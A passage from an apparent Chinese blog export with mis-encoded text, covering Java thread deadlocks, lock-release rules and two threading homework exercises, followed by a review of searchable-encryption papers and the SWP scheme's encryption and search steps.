flag;\n    }\n\n    @Override\n    public void run() {\n        //ä¸‹é¢ä¸šåŠ¡é€»è¾‘çš„åˆ†æ\n        //1. å¦‚æœflag ä¸ºT, çº¿ç¨‹A å°±ä¼šå…ˆå¾—åˆ°/æŒæœ‰o1 å¯¹è±¡é”, ç„¶åå°è¯•å»è·å–o2 å¯¹è±¡é”\n        //2. å¦‚æœçº¿ç¨‹A å¾—ä¸åˆ°o2 å¯¹è±¡é”ï¼Œå°±ä¼šBlocked\n        //3. å¦‚æœflag ä¸ºF, çº¿ç¨‹B å°±ä¼šå…ˆå¾—åˆ°/æŒæœ‰o2 å¯¹è±¡é”, ç„¶åå°è¯•å»è·å–o1 å¯¹è±¡é”\n        //4. å¦‚æœçº¿ç¨‹B å¾—ä¸åˆ°o1 å¯¹è±¡é”ï¼Œå°±ä¼šBlocked\n        if (flag) {\n            synchronized (o1) {//å¯¹è±¡äº’æ–¥é”, ä¸‹é¢å°±æ˜¯åŒæ­¥ä»£ç \n                System.out.println(Thread.currentThread().getName() + \" è¿›å…¥1\");\n                synchronized (o2) { \n                    System.out.println(Thread.currentThread().getName() + \" è¿›å…¥2\");\n                }\n            }\n        } else {\n            synchronized (o2) {\n                System.out.println(Thread.currentThread().getName() + \" è¿›å…¥3\");\n                synchronized (o1) { \n                    System.out.println(Thread.currentThread().getName() + \" è¿›å…¥4\");\n                }\n\n            }\n        }\n    }\n}\n```\n\n## é‡Šæ”¾é”\n\n**ä¸‹é¢æ“ä½œä¼šé‡Šæ”¾é”**\n\n- 1.å½“å‰çº¿ç¨‹çš„åŒæ­¥æ–¹æ³•ã€åŒæ­¥ä»£ç å—æ‰§è¡Œç»“æŸ\n  - æ¡ˆä¾‹ï¼šä¸Šå•æ‰€ï¼Œ å®Œäº‹å‡ºæ¥\n- 2.å½“å‰çº¿ç¨‹åœ¨åŒæ­¥ä»£ç å—ã€åŒæ­¥æ–¹æ³•ä¸­é‡åˆ°breakã€return\n  - æ¡ˆä¾‹ï¼šæ²¡æœ‰æ­£å¸¸çš„å®Œäº‹ï¼Œç»ç†å«ä»–ä¿®æ”¹bugï¼Œä¸å¾—å·²å‡ºæ¥\n- 3.å½“å‰çº¿ç¨‹åœ¨åŒæ­¥ä»£ç å—ã€åŒæ­¥æ–¹æ³•ä¸­å‡ºç°äº†æœªå¤„ç†çš„ Error æˆ– Exceptionï¼Œå¯¼è‡´å¼‚å¸¸ç»“æŸ\n  - æ¡ˆä¾‹ï¼šæ²¡æœ‰æ­£å¸¸çš„å®Œäº‹ï¼Œå‘ç°é©¬æ¡¶åäº†ï¼Œä¸å¾—å·²å‡ºæ¥\n- 4.å½“å‰çº¿ç¨‹åœ¨åŒæ­¥ä»£ç å—ã€åŒæ­¥æ–¹æ³•ä¸­æ‰§è¡Œäº†çº¿ç¨‹å¯¹è±¡çš„ wait() æ–¹æ³•ï¼Œå½“å‰çº¿ç¨‹æš‚åœï¼Œå¹¶é‡Šæ”¾é”ã€‚\n  - æ¡ˆä¾‹ï¼šæ²¡æœ‰æ­£å¸¸å®Œäº‹ï¼Œè§‰å¾—éœ€è¦é…é…¿ä¸‹ï¼Œæ‰€ä»¥å‡ºæ¥ç­‰ä¼šå†è¿›å»\n\n**ä¸‹é¢æ“ä½œä¸ä¼šé‡Šæ”¾é”**\n\n- 1.çº¿ç¨‹æ‰§è¡ŒåŒæ­¥ä»£ç å—æˆ–åŒæ­¥æ–¹æ³•æ—¶ï¼Œç¨‹åºè°ƒç”¨ Thread.sleep()ã€ Thread.yield() æ–¹æ³•æš‚åœå½“å‰çº¿ç¨‹çš„æ‰§è¡Œï¼Œä¸ä¼šé‡Šæ”¾é”\n  - æ¡ˆä¾‹:ä¸Šå•æ‰€ï¼Œå¤ªå›°äº†ï¼Œåœ¨å‘ä½ä¸Šçœ¯äº†ä¸€ä¼š\n- 2.çº¿ç¨‹æ‰§è¡ŒåŒæ­¥ä»£ç å—æ—¶ï¼Œå…¶ä»–çº¿ç¨‹è°ƒç”¨äº†è¯¥çº¿ç¨‹çš„ suspend() æ–¹æ³•å°†è¯¥çº¿ç¨‹æŒ‚èµ·ï¼Œè¯¥çº¿ç¨‹ä¸ä¼šé‡Šæ”¾é”ã€‚\n  - æç¤º:åº”å°½é‡é¿å…ä½¿ç”¨ suspend() å’Œ resume() æ¥æ§åˆ¶çº¿ç¨‹ï¼Œæ–¹æ³•ä¸å†æ¨èä½¿ç”¨\n\n## æœ¬ç« ç»ƒä¹ \n\n### 1.ç¼–ç¨‹é¢˜Homework01.java\n\n- (1)åœ¨ main æ–¹æ³•ä¸­å¯åŠ¨ä¸¤ä¸ªçº¿ç¨‹\n- (2)ç¬¬ 1 ä¸ªçº¿ç¨‹å¾ªç¯éšæœºæ‰“å° 100 ä»¥å†…çš„æ•´æ•°\n- (3)ç›´åˆ°ç¬¬ 2 ä¸ªçº¿ç¨‹ä»é”®ç›˜è¯»å–äº† â€œQâ€ å‘½ä»¤\n\n```java\npackage com.jwt.threaduse;\n\nimport java.util.Scanner;\n\npublic class Homework01 {\n    public static void main(String[] args) throws InterruptedException {\n        A a = new A();\n        B b = new B(a);\n        Thread thread = new Thread(b);\n        a.start();\n        thread.start();\n    }\n}\nclass A extends Thread{\n    private boolean flag = true;\n    public void setFlag(boolean flag) {\n        this.flag = flag;\n    }\n\n    @Override\n    public void run() {\n        while (flag) {\n            //1-100\n            System.out.println((int)(Math.random()*100 + 1));\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n        System.out.println(\"açº¿ç¨‹é€€å‡º\");\n    }\n}\n\nclass B implements Runnable{\n    private A a;\n    public B(A a) {\n        this.a = a;\n    }\n    @Override\n    public void run() {\n        while (true) {\n            Scanner scanner = new Scanner(System.in);\n            System.out.println(\"è¯·è¾“å…¥æŒ‡ä»¤ï¼š\");\n            String s = scanner.nextLine();\n            if (\"Q\".equals(s)) {\n                a.setFlag(false);\n                System.out.println(\"bçº¿ç¨‹é€€å‡º\");\n                break;\n            }\n        }\n    }\n}\n```\n\n### 2.ç¼–ç¨‹é¢˜Homework02.java\n\n- (1)æœ‰ 2 ä¸ªç”¨æˆ·åˆ†åˆ«ä»åŒä¸€ä¸ªå¡ä¸Šå–é’±(æ€»é¢: 10000)\n- (2)æ¯æ¬¡éƒ½å– 1000ï¼Œå½“ä½™é¢ä¸è¶³æ—¶ï¼Œå°±ä¸èƒ½å–æ¬¾äº†\n- (3)ä¸èƒ½å‡ºç°è¶…å–ç°è±¡=ã€‹çº¿ç¨‹åŒæ­¥é—®é¢˜\n\n<img src=\"https://img.jwt1399.top/img/image-20220311154710403.png\" style=\"zoom:50%;\" />\n\n```java\npackage com.jwt.threaduse;\n\npublic class Homework02 {\n    //- (1)æœ‰ 2 ä¸ªç”¨æˆ·åˆ†åˆ«ä»åŒä¸€ä¸ªå¡ä¸Šå–é’±(æ€»é¢: 10000)\n    //- (2)æ¯æ¬¡éƒ½å– 1000ï¼Œå½“ä½™é¢ä¸è¶³æ—¶ï¼Œå°±ä¸èƒ½å–æ¬¾äº†\n    //- (3)ä¸èƒ½å‡ºç°è¶…å–ç°è±¡=ã€‹çº¿ç¨‹åŒæ­¥é—®é¢˜\n    public static void main(String[] args) {\n        Card card = new Card();\n        Thread thread1 = new Thread(card);\n        thread1.setName(\"User1\");\n        Thread thread2 = new Thread(card);\n        thread2.setName(\"User2\");\n        thread1.start();\n        thread2.start();\n    }\n\n}\n\nclass Card implements Runnable{\n    private int money = 10000;\n    @Override\n    public void run() {\n        while (true){\n            //è§£è¯»\n            //1.è¿™é‡Œä½¿ç”¨synchronized å®ç°äº†çº¿ç¨‹åŒæ­¥\n            //2.å½“å¤šä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œå°±ä¼šå»äº‰å¤ºthiså¯¹è±¡é”\n            //3.å“ªä¸ªçº¿ç¨‹äº‰å¤ºåˆ°(è·å–)thiså¯¹è±¡é”ï¼Œ å°±æ‰§è¡Œsynchronized ä»£ç å—ï¼Œæ‰§è¡Œå®Œåï¼Œ ä¼šé‡Šæ”¾thiså¯¹è±¡é”\n            //4.äº‰å¤ºä¸åˆ°thiså¯¹è±¡é”ï¼Œå°±bLocked ï¼Œå‡†å¤‡ç»§ç»­äº‰å¤º\n            //5.thiså¯¹è±¡é”æ˜¯éå…¬å¹³é”\n            synchronized (this) {\n                money = money - 1000;\n                if (money < 1000) {\n                    System.out.println(\"ä½™é¢ä¸è¶³\");\n                    break;\n                }\n                System.out.println(Thread.currentThread().getName() + \"å–èµ°äº†1000\" + \"å‰©ä½™\" + money);\n            }\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n##  â¤ï¸Sponsor\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ°å·§è´¢åŠ›é›„åšï¼Œåˆæ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®æ”¯ä»˜</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡æ”¯ä»˜</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["å¤šçº¿ç¨‹"],"categories":["JavaSE"]},{"title":"å¯æœç´¢åŠ å¯†ï¼šè®ºæ–‡é˜…è¯»","url":"/posts/30661.html","content":"\n## SE è®ºæ–‡é˜…è¯»\n\n### è®ºæ–‡æ¸…å•\n\n| åºå· | è®ºæ–‡åç§°                                                     | ä½œè€…  <br/>å¹´ä»½  | å•ä½               | æ¥æº             | ç­‰çº§[CCF](https://www.ccf.org.cn/Academic_Evaluation/NIS/) |\n| ---- | ------------------------------------------------------------ | ---------------- | ------------------ | ---------------- | :--------------------------------------------------------: |\n| 1    | Practical Techniques for Searches on Encrypted Data          | D.Song      2000 | åŠ å·å¤§å­¦ä¼¯å…‹åˆ©åˆ†æ ¡ | IEEE S&P         |                             A                              |\n| 2    | Multi-Keyword Fuzzy Search over Encrypted Data               | ç‹æºç’‡      2017 | ä¸œåŒ—å¤§å­¦           | è®¡ç®—æœºç ”ç©¶ä¸å‘å±• |                             â€”â€”                             |\n| 3    | Toward Efficient Multi-Keyword Fuzzy Search Over Encrypted Outsourced Data With Accuracy Improvement | å‚…å¼ æ°2016       | å—äº¬ä¿¡æ¯å·¥ç¨‹å¤§å­¦   | IEEE TIFS        |                             A                              |\n| 4    | Efficient dynamic multi-keyword fuzzy search over encrypted cloud data | æ´ªå¿   2020       | å®‰å¾½å¤§å­¦           | ELSEVIER JNCA    |                             C                              |\n| 5    | VRFMS: Verifiable Ranked Fuzzy Multi-keyword Search over Encrypted Data | æå…´å      2022 | è¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦   | IEEE TSC         |                             B                              |\n| 6    | EliMFS: Achieving Efficient, Leakage-Resilient, and Multi-Keyword Fuzzy Search on Encrypted Cloud Data | é™ˆé™  2017       | æ­¦æ±‰å¤§å­¦           | IEEE TSC         |                             B                              |\n\n### è®ºæ–‡ç®€ä»‹\n\n> å¦‚ä¸‹æ˜¯å¯¹ä¸Šæ–¹æ¸…å•ä¸­è®ºæ–‡å†…å®¹åšä¸€ä¸ªç®€å•çš„æ¦‚è¿°ï¼Œä»¥æ–¹ä¾¿ä½ å¿«é€Ÿäº†è§£è®ºæ–‡æ‰€ç ”ç©¶å†…å®¹\n\n**[1] Practical Techniques for Searches on Encrypted Dataï¼ˆæœç´¢åŠ å¯†æ•°æ®çš„å®ç”¨æŠ€æœ¯ï¼‰**\n\n| å¤šå…³é”®å­— | æ¨¡ç³Šæœç´¢ | å¯éªŒè¯æœç´¢ |\n| :------: | :------: | :--------: |\n|    âŒ     |    âŒ     |     âŒ      |\n\n- **ç®€è¦å†…å®¹ï¼š**æœ¬æ–‡**é¦–æ¬¡æå‡º**äº†`ä¸€ç§æœç´¢åŠ å¯†æ•°æ®çš„å®ç”¨æŠ€æœ¯ï¼ˆSWPï¼‰`ï¼Œè¯¥æ–¹æ¡ˆé€šè¿‡å°†æ˜æ–‡æ•°æ®åˆ’åˆ†æˆä¸€ä¸ªä¸ªçš„å•è¯ï¼Œåˆ†åˆ«åŠ å¯†æ¯ä¸ªå•è¯ï¼Œç„¶åå°†ä¸€ä¸ª**å“ˆå¸Œå€¼**ï¼ˆå…·æœ‰ç‰¹æ®Šæ ¼å¼ï¼‰åµŒå…¥å¯†æ–‡ä¸­ï¼ŒæœåŠ¡å™¨å¯ä»¥æå–è¯¥å“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥è¯¥å€¼æ˜¯å¦å…·æœ‰è¿™ç§ç‰¹æ®Šæ ¼å¼ï¼Œç¡®è®¤æ˜¯å¦åŒ¹é…æœç´¢ã€‚\n\n------\n\n**[2] Multi-Keyword Fuzzy Search over Encrypted Dataï¼ˆMKFSï¼šé¢å‘å¤šå…³é”®å­—çš„æ¨¡ç³Šå¯†æ–‡æœç´¢æ–¹æ³•ï¼‰**\n\n| å¤šå…³é”®å­— | æ¨¡ç³Šæœç´¢ | å¯éªŒè¯æœç´¢ |\n| :------: | :------: | :--------: |\n|    âœ…     | âœ…LSH+BF  |     âŒ      |\n\n- **ç®€è¦å†…å®¹ï¼š**æœ¬æ–‡æå‡ºäº†`ä¸€ç§é¢å‘å¤šå…³é”®å­—çš„æ¨¡ç³Šå¯†æ–‡æœç´¢æ–¹æ¡ˆï¼ˆMKFSï¼‰`ï¼Œè¯¥æ–¹æ¡ˆä»¥**å¸ƒéš†è¿‡æ»¤å™¨**ä¸ºåŸºç¡€ï¼Œä½¿ç”¨**å¯¹å¶ç¼–ç å‡½æ•°**å’Œ**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œå‡½æ•°**æ¥å¯¹æ–‡ä»¶ç´¢å¼•è¿›è¡Œæ„å»ºï¼Œå¹¶ä½¿ç”¨**è·ç¦»å¯æ¢å¤åŠ å¯†ç®—æ³•**å¯¹è¯¥ç´¢å¼•è¿›è¡ŒåŠ å¯†ï¼Œå®ç°äº†å¯¹**å¤šå…³é”®å­—çš„å¯†æ–‡æ¨¡ç³Šæœç´¢**ã€‚åŒæ—¶æ–¹æ¡ˆä¸éœ€è¦æå‰è®¾ç½®ç´¢å¼•å­˜å‚¨ç©ºé—´ï¼Œä»è€Œå¤§å¤§é™ä½äº†æœç´¢çš„å¤æ‚åº¦ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¯¥æ–¹æ¡ˆä¸å·²æœ‰æ–¹æ¡ˆç›¸æ¯”ä¸éœ€è¦é¢„å®šä¹‰å­—å…¸åº“ï¼Œé™ä½äº†å­˜å‚¨å¼€é”€ã€‚å®éªŒåˆ†æå’Œå®‰å…¨åˆ†æè¡¨æ˜ï¼Œè¯¥æ–¹æ¡ˆä¸ä»…èƒ½å¤Ÿå®ç°é¢å‘å¤šå…³é”®å­—çš„å¯†æ–‡æ¨¡ç³Šæœç´¢ï¼Œè€Œä¸”ä¿è¯äº†æ–¹æ¡ˆçš„æœºå¯†æ€§å’Œéšç§æ€§ã€‚\n\n------\n\n**[3] Toward Efficient Multi-Keyword Fuzzy Search Over Encrypted Outsourced Data With Accuracy Improvementï¼ˆTEMKFSï¼šé€šè¿‡æé«˜å‡†ç¡®æ€§ï¼Œåœ¨åŠ å¯†çš„å¤–åŒ…æ•°æ®ä¸Šå®ç°é«˜æ•ˆçš„å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢ï¼‰**\n\n| å¤šå…³é”®å­— | æ¨¡ç³Šæœç´¢ | å¯éªŒè¯æœç´¢ |\n| :------: | :------: | :--------: |\n|    âœ…     | âœ…LSH+BF  |     âŒ      |\n\n- **ç®€è¦å†…å®¹ï¼š**æœ¬æ–‡æå‡ºäº†`ä¸€ç§é«˜æ•ˆå¤šå…³é”®è¯æ¨¡ç³Šæ’åæœç´¢æ–¹æ¡ˆ`ï¼Œä½¿ç”¨**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ**å’Œ**å¸ƒéš†è¿‡æ»¤å™¨**æ¥å®ç°**æ¨¡ç³Šå…³é”®å­—æœç´¢**ï¼Œé¦–å…ˆå¼€å‘äº†ä¸€ç§åŸºäº **uni-gram å…³é”®å­—è½¬æ¢**æ–°æ–¹æ³•ï¼Œå®ƒå°†åŒæ—¶æé«˜å‡†ç¡®æ€§å¹¶åˆ›å»ºå¤„ç†å…¶ä»–æ‹¼å†™é”™è¯¯çš„èƒ½åŠ›ã€‚æ­¤å¤–ï¼Œå¯ä»¥ä½¿ç”¨**è¯å¹²åˆ†æç®—æ³•**æŸ¥è¯¢å…·æœ‰ç›¸åŒæ ¹çš„å…³é”®å­—ã€‚æ­¤å¤–ï¼Œåœ¨é€‰æ‹©é€‚å½“çš„åŒ¹é…æ–‡ä»¶é›†æ—¶ï¼Œè¯¥æ–¹æ¡ˆä¼šè€ƒè™‘å…³é”®å­—æƒé‡ã€‚ä½¿ç”¨çœŸå®æ•°æ®è¿›è¡Œçš„å®éªŒè¡¨æ˜ï¼Œæˆ‘ä»¬çš„æ–¹æ¡ˆå®é™…ä¸Šæ•ˆç‡é«˜ï¼Œç²¾åº¦é«˜ã€‚\n\n------\n\n**[4] Efficient dynamic multi-keyword fuzzy search over encrypted cloud dataï¼ˆEDMKFSï¼šå¯¹åŠ å¯†çš„äº‘æ•°æ®è¿›è¡Œé«˜æ•ˆçš„åŠ¨æ€å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢ï¼‰**\n\n| å¤šå…³é”®å­— | æ¨¡ç³Šæœç´¢ | å¯éªŒè¯æœç´¢ | åŠ¨æ€æ›´æ–° |\n| :------: | :------: | :--------: | :------: |\n|    âœ…     | âœ…LSH+BF  |     âŒ      |    âœ…     |\n\n- **ç®€è¦å†…å®¹ï¼š**æœ¬æ–‡æå‡º`ä¸€ç§æ”¯æŒåŠ¨æ€æ–‡ä»¶æ›´æ–°çš„åŠ å¯†äº‘æ•°æ®åŠ¨æ€å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢æ–¹æ¡ˆ`ã€‚**å±€éƒ¨æ€§æ•æ„Ÿæ•£åˆ—**å’Œ**å¸ƒéš†è¿‡æ»¤å™¨**ç”¨äºç”Ÿæˆç´¢å¼•å‘é‡å’ŒæŸ¥è¯¢å‘é‡ã€‚åŸºäºç”Ÿæˆçš„å‘é‡ï¼Œæ„å»º**å¹³è¡¡äºŒå‰æ ‘**ä½œä¸ºæ•´ä¸ªæ–‡ä»¶é›†çš„ç´¢å¼•ï¼Œå¹¶å¼€å‘**Top-k æœç´¢ç®—æ³•**ï¼Œå€ŸåŠ©ç´¢å¼•æ ‘æœç´¢ä¸ç»™å®šæŸ¥è¯¢æœ€ç›¸å…³çš„ k ä¸ªæ–‡ä»¶ã€‚åœ¨çœŸå®æ•°æ®é›†ä¸Šè¿›è¡Œçš„å¹¿æ³›å®éªŒè¡¨æ˜ï¼Œæˆ‘ä»¬çš„æ–¹æ¡ˆæ¯”ç°æœ‰çš„ç±»ä¼¼æ–¹æ¡ˆæ›´æœ‰æ•ˆã€‚\n\n------\n\n**[5] VRFMS: Verifiable Ranked Fuzzy Multi-keyword Search over Encrypted Dataï¼ˆVRFMSï¼šå¯éªŒè¯æ’åºæ¨¡ç³Šå¤šå…³é”®å­—å¯†æ–‡æœç´¢ï¼‰**\n\n| å¤šå…³é”®å­— | æ¨¡ç³Šæœç´¢ | å¯éªŒè¯æœç´¢ | åŠ¨æ€æ›´æ–° |\n| :------: | :------: | :--------: | :------: |\n|    âœ…     | âœ…LSH+BF  |     âœ…      |    âœ…     |\n\n- **ç®€è¦å†…å®¹ï¼š**æœ¬æ–‡æå‡ºäº†`ä¸€ç§é«˜æ•ˆä¸”å¯éªŒè¯æ’åºæ¨¡ç³Šå¤šå…³é”®å­—å¯†æ–‡æœç´¢æ–¹æ¡ˆï¼ˆVRFMSï¼‰`ï¼Œä½¿ç”¨**å±€éƒ¨æ•æ„Ÿå“ˆå¸Œ**å’Œ**å¸ƒéš†è¿‡æ»¤å™¨**æ¥å®ç°**æ¨¡ç³Šå…³é”®å­—æœç´¢**ï¼Œå¹¶é‡‡ç”¨**è¯é¢‘-é€†æ–‡æ¡£é¢‘åº¦ï¼ˆTF-IDFï¼‰** å¯¹æŸ¥è¯¢ç»“æœè¿›è¡Œæ’åºã€‚ä¸ºäº†è¿›ä¸€æ­¥æé«˜æœç´¢å‡†ç¡®æ€§ï¼Œè¿˜è®¾è®¡äº†ä¸€ç§æ”¹è¿›çš„**bi-gram å…³é”®å­—è½¬æ¢**æ–¹æ³•ã€‚æ­¤å¤–ï¼Œåˆ©ç”¨**åŒæ€MACæŠ€æœ¯**å’Œ**éšæœºè´¨è¯¢æŠ€æœ¯**åˆ†åˆ«éªŒè¯äº†è¿”å›ç»“æœçš„æ­£ç¡®æ€§å’Œå®Œæ•´æ€§ã€‚å½¢å¼å®‰å…¨åˆ†æå’Œå®è¯å®éªŒè¡¨æ˜ï¼ŒVRFMSåœ¨å®é™…åº”ç”¨ä¸­åˆ†åˆ«å…·æœ‰å®‰å…¨æ€§å’Œæœ‰æ•ˆæ€§ã€‚\n\n------\n\n**[6] EliMFS: Achieving Efficient, Leakage-Resilient, and Multi-Keyword Fuzzy Search on Encrypted Cloud Dataï¼ˆEliMFSï¼šåœ¨åŠ å¯†çš„äº‘æ•°æ®ä¸Šå®ç°é«˜æ•ˆã€é˜²æ³„æ¼å’Œå¤šå…³é”®å­—æ¨¡ç³Šæœç´¢ï¼‰**\n\n| å¤šå…³é”®å­— | æ¨¡ç³Šæœç´¢ | å¯éªŒè¯æœç´¢ |\n| :------: | :------: | :--------: |\n|    âœ…     | âœ…LSH+BF  |     âŒ      |\n\n- **ç®€è¦å†…å®¹ï¼š**æœ¬æ–‡æå‡ºäº†`ä¸€ç§åŸºäºåŠ å¯†äº‘æ•°æ®çš„é«˜æ•ˆæ³„æ¼å¼¹æ€§å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢ (EliMFS) æ¡†æ¶`ã€‚åœ¨è¿™ä¸ªæ¡†æ¶ä¸­ï¼Œåˆ©ç”¨äº†ä¸€ç§æ–°é¢–çš„**ä¸¤é˜¶æ®µç´¢å¼•ç»“æ„**ï¼ˆç”±æ­£å‘ç´¢å¼•å’Œå€’æ’ç´¢å¼•ç»„æˆï¼‰æ¥ç¡®ä¿æœç´¢æ—¶é—´ä¸æ–‡ä»¶é›†å¤§å°æ— å…³ã€‚å¤šå…³é”®å­—æ¨¡ç³Šæœç´¢é€šè¿‡åŸºäº **Gram Counting Order**ã€**å¸ƒéš†è¿‡æ»¤å™¨**å’Œ**å±€éƒ¨æ•æ„Ÿæ•£åˆ—**çš„ç²¾ç»†è®¾è®¡å®ç°çš„ã€‚æ­¤å¤–ï¼Œè€ƒè™‘åˆ°ç”±ä¸¤é˜¶æ®µç´¢å¼•ç»“æ„å¼•èµ·çš„æ³„æ¼ï¼Œæˆ‘ä»¬æå‡ºäº†ä¸¤ç§å…·ä½“çš„æ–¹æ¡ˆæ¥æŠµæŠ—ä¸åŒå¨èƒæ¨¡å‹ä¸­çš„è¿™äº›æ½œåœ¨æ”»å‡»ã€‚å¹¿æ³›çš„åˆ†æå’Œå®éªŒè¡¨æ˜ï¼Œæˆ‘ä»¬çš„æ–¹æ¡ˆæ˜¯é«˜æ•ˆå’ŒæŠ—æ³„æ¼çš„ã€‚\n\n------\n\n## â‘ SWPæ–¹æ¡ˆ\n\n**è®ºæ–‡åç§°ï¼šã€ŠPractical Techniques for Searches on Encrypted Dataã€‹**\n\nè¯¥ç¯‡è®ºæ–‡æ˜¯ SE çš„å¼€å±±ä¹‹ä½œï¼Œè¿™æ˜¯é¦–æ¬¡ç ”ç©¶å‡ºæ”¯æŒå¯¹æ•°æ®åŠ å¯†åè¿›è¡Œæœç´¢çš„å¯†ç æŠ€æœ¯ï¼Œæå‡ºäº†ç¬¬ä¸€ä¸ªå®ç”¨çš„å¯æœç´¢åŠ å¯†æ–¹æ¡ˆ SWPï¼Œç”±æ­¤å¼€è¾Ÿäº†å¯†ç å­¦ä¸­çš„å…¨æ–°ç ”ç©¶æ–¹å‘â€”â€”`å¯æœç´¢åŠ å¯†(Searchable Encryption)`ã€‚\n\n- ä½œè€…ï¼šDawn Xiaoding Songã€D. Wagner, and A. Perrig.S\n- å•ä½ï¼šUniversity of California, Berkeley\n- åˆŠç‰©ï¼š[Proceedings of the 2000 IEEE Symposium on Security and Privacy](http://ieeexplore.ieee.org/abstract/document/848445/)ã€CCF Aã€‘\n- æ—¶é—´ï¼š2000å¹´5æœˆ\n- è¢«å¼•æ¬¡æ•°ï¼š4111ï¼ˆæˆªè‡³2021å¹´1æœˆ18æ—¥ï¼Œæ¥æºGoogle Scholarï¼‰\n\n### 1ã€æ€»ä½“æ€è·¯\n\nè¯¥æ–¹æ¡ˆé€šè¿‡å°†æ˜æ–‡æ•°æ®åˆ’åˆ†æˆä¸€ä¸ªä¸ªçš„å•è¯ï¼Œåˆ†åˆ«åŠ å¯†æ¯ä¸ªå•è¯ï¼Œç„¶åå°†ä¸€ä¸ªå“ˆå¸Œå€¼ï¼ˆå…·æœ‰ç‰¹æ®Šæ ¼å¼ï¼‰åµŒå…¥å¯†æ–‡ä¸­ï¼ŒæœåŠ¡å™¨å¯ä»¥æå–è¯¥å“ˆå¸Œå€¼ï¼Œå¹¶æ£€æŸ¥è¯¥å€¼æ˜¯å¦å…·æœ‰è¿™ç§ç‰¹æ®Šæ ¼å¼ï¼Œç¡®è®¤æ˜¯å¦åŒ¹é…æœç´¢ã€‚\n\n### 2ã€æ–¹æ¡ˆå®ç°\n\n#### åŠ å¯†è¿‡ç¨‹\n\n![](https://img.jwt1399.top/img/6f0da209ec0491ac9813bd044550f4da_5_Figure_3.png)\n\n- å°†æ˜æ–‡æ•°æ®æ‹†åˆ† ä¸ºå›ºå®šå¤§å°çš„å•è¯ W<sub>i</sub> \n\n- å¹¶ä½¿ç”¨ç¡®å®šæ€§åŠ å¯†ç®—æ³• E è¿›è¡ŒåŠ å¯† E(W<sub>i</sub>) = X<sub>i</sub>   \n\n- ç„¶åå°†åŠ å¯†çš„å•è¯ X<sub>i</sub>  åˆ’åˆ†ä¸ºå·¦å³ä¸¤éƒ¨åˆ† X<sub>i</sub> = <L<sub>i</sub>ï¼ŒR<sub>i</sub>>ã€‚\n\n- ä½¿ç”¨å¸¦å¯†é’¥çš„ Hash å‡½æ•° f å¯¹ L<sub>iÂ </sub>è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œk' ä¸ºå›ºå®šå¯†é’¥ï¼Œè®¡ç®—å¾—åˆ°æ–°å¯†é’¥ k<sub>i</sub> = f<sub>k'</sub>(L<sub>i</sub>) \n- å€ŸåŠ©æµå¯†ç äº§ç”Ÿä¼ªéšæœºå€¼ S<sub>i</sub>ï¼Œç”¨äºå¸¦å¯†é’¥çš„ Hash å‡½æ•° F æ¥å¯¹å€¼ S<sub>i</sub> åšå“ˆå¸Œè¿ç®—ï¼Œä»¥ k<sub>i</sub> ä¸ºå¯†é’¥ï¼Œå¾—åˆ°F<sub>k<sub>i</sub></sub>(S<sub>i</sub>)\n- å°†  S<sub>i</sub> ä¸ ,F<sub>k<sub>i</sub></sub> (S<sub>i</sub>) æ‹¼æ¥å¾—åˆ°  Y<sub>i</sub> = <S<sub>i</sub>ï¼ŒF<sub>k<sub>i</sub></sub>(S<sub>i</sub>)>\n- æœ€ç»ˆå°† Y<sub>i</sub> ä¸ X<sub>i</sub>  å¼‚æˆ–å¾—åˆ°æœ€åçš„å¯†æ–‡ C<sub>iÂ </sub> = X<sub>i</sub> âŠ• Y<sub>i</sub>ï¼Œä¸Šä¼ è‡³ä¸å¯ä¿¡æœåŠ¡å™¨\n\n#### æ£€ç´¢è¿‡ç¨‹\n\n![](https://img.jwt1399.top/img/image-20220119194328708.png)\n\n- æŠŠè¦æŸ¥è¯¢çš„å…³é”®è¯å¯¹åº”çš„ X<sub>iÂ </sub>å’Œ k<sub>i</sub> å‘ŠçŸ¥æœåŠ¡å™¨æ¥è¿›è¡Œæ£€ç´¢ï¼Œç”Ÿæˆæ–¹å¼ä¸åŠ å¯†è¿‡ç¨‹ç›¸åŒã€‚\n- æœåŠ¡å™¨å¾—åˆ° X<sub>i</sub> å’Œ  k<sub>i</sub> åï¼Œå…ˆè®¡ç®— Y<sub>i</sub> = C<sub>i</sub> âŠ•  X<sub>i</sub> \n- å°† Y<sub>i</sub> åˆ’åˆ†ä¸º Y<sub>i</sub>L å’Œ Y<sub>i</sub>R  ï¼Œå³ Y<sub>i</sub> = <T<sub>i</sub>Lï¼ŒT<sub>i</sub>R >\n- ä½¿ç”¨å¸¦å¯†é’¥çš„ Hash å‡½æ•° F å¯¹  Y<sub>i</sub>L è¿›è¡ŒåŠ å¯†ï¼Œä»¥ k<sub>i</sub> 